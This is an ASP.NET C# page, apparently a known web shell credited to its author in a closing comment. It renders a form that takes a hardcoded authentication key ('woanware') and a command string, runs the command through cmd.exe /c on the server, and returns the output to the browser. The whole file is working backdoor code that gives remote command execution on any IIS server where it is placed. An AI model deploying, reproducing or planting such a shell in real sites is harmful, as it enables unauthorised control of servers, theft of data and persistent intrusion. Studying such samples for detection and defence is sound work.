<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    private const string AUTHKEY = "woanware";

    private const string HEADER = "<html>\n<head>\n<title>command</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";

    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    protected void Page_Load(object sender, EventArgs e)
    {
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    protected void btnExecute_Click(object sender, EventArgs e)
    {
    	if (txtAuthKey.Text != AUTHKEY)
    	{
    	    return;
	    }
			
        Response.Write(HEADER);
        Response.Write("<pre>");
        Response.Write(Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text)));
        Response.Write("</pre>");
        Response.Write(FOOTER);
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="command"></param>
    /// <returns></returns>
    private string ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + command;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;

            Process process = Process.Start(processStartInfo);
            using (StreamReader streamReader = process.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();

                return ret;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
    <title>Command</title>
</head>
<body>
    <form id="formCommand" runat="server">
    <div>
        <table>
            <tr>
                <td width="30">Auth Key:</td>
		        <td><asp:TextBox id="txtAuthKey" runat="server"></asp:TextBox></td>
            </tr>
            <tr>
                <td width="30">Command:</td>
                <td><asp:TextBox ID="txtCommand" runat="server" Width="820px"></asp:TextBox></td>
            </tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="btnExecute" runat="server" OnClick="btnExecute_Click" Text="Execute" /></td>
            </tr>
        </table>
    </div>
    </form>
</body>
</html>

<!-- Created by Mark Woan (http://www.woanware.co.uk) -->